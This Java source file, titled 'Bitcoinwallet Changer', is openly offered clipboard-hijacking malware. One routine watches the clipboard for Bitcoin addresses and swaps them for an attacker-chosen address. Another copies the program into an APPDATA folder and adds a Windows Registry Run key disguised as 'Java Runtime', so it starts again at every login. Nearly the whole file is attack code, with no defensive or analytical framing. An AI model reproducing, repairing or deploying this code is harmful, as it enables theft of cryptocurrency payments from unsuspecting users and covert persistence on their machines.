/*
Created by XEFER on 14/03/2020
Bitcoinwallet Changer
*/

package me.xefer;

import java.awt.*;
import java.awt.datatransfer.Clipboard;
import java.awt.datatransfer.DataFlavor;
import java.awt.datatransfer.StringSelection;
import java.awt.datatransfer.UnsupportedFlavorException;
import java.io.File;
import java.io.IOException;

public class Main {
    public static void main(String[] args) throws IOException, UnsupportedFlavorException {
        String fileName = "TEST.java";
        StringSelection yourAddress = new StringSelection( "Hello World" );
        String path_jar = System.getenv("APPDATA") + "\\java\\runtime\\";
        workHorse(yourAddress);
        minimalPersistance(path_jar, fileName);
    }
    public static void workHorse(StringSelection yourAddress) throws IOException, UnsupportedFlavorException {
        Clipboard c = Toolkit.getDefaultToolkit().getSystemClipboard();
        if (String.valueOf(c.getData(DataFlavor.stringFlavor)).matches("^[13][a-km-zA-HJ-NP-Z1-9]{25,34}$")) {
            c.setContents(yourAddress, yourAddress);
            workHorse(yourAddress);
        }
        //workHorse(yourAddress);

    }
    public static void minimalPersistance(String path_jar, String fileName) throws IOException, UnsupportedFlavorException {
        if (System.getProperty("os.name").contains("windows")) {
            File fff = new File(System.getProperty("user.dir") + "\\" + fileName);
            File ff = new File(path_jar);
            if (!ff.exists()) {
                ff.mkdirs();
            }
            else if (ff.exists()) {
                fff.renameTo(new File(path_jar + "\\" + fileName));
                fff.delete();
            }
            Runtime.getRuntime().exec("REG ADD HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run /V \"Java Runtime\" /t REG_SZ /F /D \"" + path_jar + "\\" + fileName + "\"");
        }
    }
}
